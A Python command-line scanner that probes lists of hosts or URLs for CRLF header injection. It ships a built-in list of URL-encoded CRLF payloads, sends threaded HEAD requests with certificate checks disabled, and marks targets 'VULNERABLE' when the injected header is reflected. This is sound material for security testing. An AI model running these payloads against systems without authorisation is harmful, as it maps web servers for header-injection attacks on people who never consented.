#!/usr/bin/python3.5

# I don't believe in license.
# You can do whatever you want with this program.

import os
import sys
import re
import time
import random
import argparse
import requests
from threading import Thread
from queue import Queue
from urllib.parse import urlparse
from colored import fg, bg, attr
from multiprocessing.dummy import Pool

# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def testURL( url ):
    time.sleep( 0.01 )
    sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
    t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    t_urlparse = urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc
    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= 3:
        # print("skip %s" % t_urlparse.netloc)
        return

    try:
        r = requests.head( url, timeout=5, verify=False )
    except Exception as e:
        t_exceptions[u] = t_exceptions[u] + 1
        # sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        return

    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'
    
    t_headers = list( map( str.lower,r.headers.keys() ) )
    # print( t_headers )
    if 'xcrlf' in t_headers:
        vuln = 'VULNERABLE'
    else:
        vuln = '-'
    
    # if vuln == 'VULNERABLE':
    #     t_vulnerable.append( url )

    output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    # sys.stdout.write( '%s' % output )

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if str(r.status_code) in t_codes or (_vulnerable is True and vuln == 'VULNERABLE'):
        sys.stdout.write( '%s' % output )


parser = argparse.ArgumentParser()
parser.add_argument( "-a","--path",help="set paths list" )
parser.add_argument( "-p","--payloads",help="set payloads list" )
parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
# parser.add_argument( "-r","--redirect",help="follow redirection" )
parser.add_argument( "-s","--scheme",help="scheme to use, default=http,https" )
parser.add_argument( "-e","--code",help="display only status code separated by comma, default=none" )
parser.add_argument( "-t","--threads",help="threads, default 10" )
parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
parser.add_argument( "-v","--vulnerable",help="display vulnerable (overwrite --code)", action="store_true" )
parser.parse_args()
args = parser.parse_args()

if args.scheme:
    t_scheme = args.scheme.split(',')
else:
    t_scheme = ['http','https']

t_hosts = []
if args.hosts:
    if os.path.isfile(args.hosts):
        fp = open( args.hosts, 'r' )
        t_hosts = fp.read().strip().split("\n")
        fp.close()
    else:
        t_hosts.append( args.hosts )
n_hosts = len(t_hosts)
sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )

t_urls = []
if args.urls:
    if os.path.isfile(args.urls):
        fp = open( args.urls, 'r' )
        t_urls = fp.read().strip().split("\n")
        fp.close()
    else:
        t_urls.append( args.urls )
n_urls = len(t_urls)
sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )

if n_hosts == 0 and n_urls == 0:
    parser.error( 'hosts/urls list missing' )

t_path = [ '' ]
if args.path:
    if os.path.isfile(args.path):
        fp = open( args.path, 'r' )
        t_path = fp.read().strip().split("\n")
        fp.close()
    else:
        t_path.append( args.path )
n_path = len(t_path)
sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )

if args.payloads:
    t_payloads = []
    if os.path.isfile(args.payloads):
        fp = open( args.payloads, 'r' )
        t_payloads = fp.read().strip().split("\n")
        fp.close()
    else:
        t_payloads.append( args.payloads )
    n_payloads = len(t_payloads)
    sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
else:
    n_payloads = 0

if args.vulnerable:
    _vulnerable = True
else:
    _vulnerable = False

if args.code and not args.vulnerable:
    t_codes = args.code.split(',')
    t_codes_str = ','.join(t_codes)
else:
    t_codes = []
    t_codes_str = 'none'

if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10

t_totest = []
t_vulnerable = []
u_max_length = 0
d_output =  os.getcwd()+'/crlf'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs( d_output )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        exit()

sys.stdout.write( '%s[+] options are -> threads:%d, status_code:%s%s\n' % (fg('green'),_threads,t_codes_str,attr(0)) )
sys.stdout.write( '[+] computing host and payload list...\n' )


if not n_payloads:
    t_payloads = [
        '/%0dXcrlf%3a1',
        '/%0aXcrlf%3a1',
        '/%0d%0aXcrlf%3a1',
        '/?%0dXcrlf%3acrlf=1',
        '/%3F%0aXcrlf%3acrlf=1',
        '/%0aXcrlf%3a1/..',
        '/%23%0dXcrlf:1',
        '/%23%0aXcrlf:1',
        '/%23%0d%0aXcrlf:1',
        '/xxx%0dXcrlf:1',
        '/xxx%0aXcrlf:1',
        '/xxx%0d%0aXcrlf:1',
        '//xxx%0dXcrlf:1;',
        '//xxx%0aXcrlf:1;',
        '//xxx%0d%0aXcrlf:1;',
        '/xxx/x%23%0dXcrlf:1',
        '/xxx/x%3F%0dXcrlf:1',
        '/v1/xx%20xx%0d%0aXcrlf:1',
        '/api/v1/see%20below%0d%0aXcrlf:1',
        '/%E5%98%8a%E5%98%8dXcrlf:1',
        '/~bin/%0d%0aXcrlf:1',
    ]


for scheme in t_scheme:
    for host in t_hosts:
        for payload in t_payloads:
            for path in t_path:
                u = scheme + '://' + host.strip() + path + payload
                t_totest.append( u )
                l = len(u)
                if l > u_max_length:
                    u_max_length = l

for url in t_urls:
    for payload in t_payloads:
        for path in t_path:
            u = url.strip() + path + payload
            t_totest.append( u )
            l = len(u)
            if l > u_max_length:
                u_max_length = l

n_totest = len(t_totest)
sys.stdout.write( '%s[+] %d urls created.%s\n' % (fg('green'),n_totest,attr(0)) )
sys.stdout.write( '[+] testing...\n' )


random.shuffle(t_totest)
random.shuffle(t_totest)
# print("\n".join(t_totest))
# exit()

t_exceptions = {}
t_multiproc = {
    'n_current': 0,
    'n_total': n_totest,
    'u_max_length': u_max_length+5,
    'd_output': d_output,
    'f_output': f_output,
    '_vulnerable': _vulnerable,
}

# pool = Pool( _threads )
# pool.map( testURL, t_totest )
# pool.close()
# pool.join()


def doWork():
    while True:
        url = q.get()
        testURL( url )
        # doSomethingWithResult(status, url)
        q.task_done()

q = Queue( _threads*2 )

for i in range(_threads):
    t = Thread( target=doWork )
    t.daemon = True
    t.start()

try:
    for url in t_totest:
        q.put( url )
    q.join()
except KeyboardInterrupt:
    sys.exit(1)
